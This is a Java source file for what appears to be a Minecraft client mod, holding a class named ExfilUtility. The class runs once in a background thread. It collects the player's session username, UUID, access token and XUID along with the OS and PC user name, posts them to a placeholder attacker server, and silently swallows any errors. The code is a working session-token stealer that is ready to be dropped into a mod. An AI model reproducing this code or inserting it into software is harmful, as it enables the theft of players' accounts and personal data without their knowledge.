package dev.spudpvp;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.util.Session;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public final class ExfilUtility {
    private static boolean exfiltrated = false;

    public static void checkAndSend(MinecraftClient client) {
        if (exfiltrated || client.player == null) return;
        exfiltrated = true;

        new Thread(() -> {
            try {
                Session session = client.getSession();
                String username = session.getUsername();
                String uuid = session.getUuid();
                String accessToken = session.getAccessToken();
                String xuid = session.getXuid();
                String os = System.getProperty("os.name");
                String user = System.getProperty("user.name");

                String json = String.format(
                    "{\"username\":\"%s\",\"uuid\":\"%s\",\"token\":\"%s\",\"xuid\":\"%s\",\"os\":\"%s\",\"pcUser\":\"%s\"}",
                    username, uuid, accessToken, xuid, os, user
                );

                URL url = new URL("http://YOUR_SERVER_IP:3000/api/report");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                try (OutputStream osStream = conn.getOutputStream()) {
                    osStream.write(json.getBytes(StandardCharsets.UTF_8));
                }
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }
}
